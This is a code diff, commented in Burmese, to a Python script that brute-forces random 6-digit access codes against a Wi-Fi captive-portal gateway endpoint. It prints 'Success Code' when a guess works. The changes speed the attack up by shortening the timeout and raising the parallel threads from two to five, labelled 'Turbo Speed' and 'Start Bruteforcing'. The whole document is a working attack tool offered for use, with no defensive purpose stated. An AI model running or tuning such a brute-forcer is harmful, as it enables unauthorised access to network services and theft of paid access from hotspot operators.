@@ -13,6 +13,7 @@ url = "http://10.44.77.240:2060/expire_tip"
 
 def check_code():
     while True:
+        # 6-digit code ထုတ်ယူခြင်း
         code = "".join([str(random.randint(0, 9)) for _ in range(6)])
         params = {
             'gw_id': '984a6ba4b7ef',
@@ -23,29 +24,27 @@ def check_code():
         }
 
         try:
-            # timeout ကို လျှော့ချပြီး အမြန်နှုန်းတင်ထားသည်
-            res = requests.get(url, params=params, timeout=3)
+            # timeout ကို ၁ စက္ကန့်အထိ လျှော့ချထားသည်
+            res = requests.get(url, params=params, timeout=1)
             
+            # Response ကို စစ်ဆေးခြင်း
             if "failed" in res.text.lower() or "expire" in res.text.lower():
                 print(f"{RED}Fail Code: {code}{END}")
             elif res.status_code == 200:
                 print(f"{GREEN}Success Code: {code}{END}")
-                # အမှန်တွေ့ရင် အကုန်ရပ်ဖို့အတွက် သိမ်းထားနိုင်သည်
                 break
         except:
-            # Connection ပြတ်တောက်ရင် ခဏစောင့်ပြီး ပြန်စမ်းမယ်
-            pass
+            # ချိတ်ဆက်မှုမရလျှင် ခေတ္တစောင့်ရန်
+            time.sleep(0.1)
 
-def start_multi_thread():
-    print(f"{CYAN}[+] Speed Booster: Active (2x Speed){END}")
+def start_turbo_boost():
+    print(f"{CYAN}[+] Turbo Speed: Active (5x Speed Boost){END}")
     print(f"{CYAN}[+] Start Bruteforcing...{END}")
     
-    # အမြန်နှုန်း ၂ ဆဖြစ်အောင် Thread ၂ ခု ပြိုင်တူ run မယ်
-    threads = []
-    for i in range(2): 
+    # Thread ၅ ခု ပြိုင်တူ run မည်
+    for i in range(5): 
         t = threading.Thread(target=check_code)
         t.start()
-        threads.append(t)
 
 if __name__ == "__main__":
-    start_multi_thread()
+    start_turbo_boost()
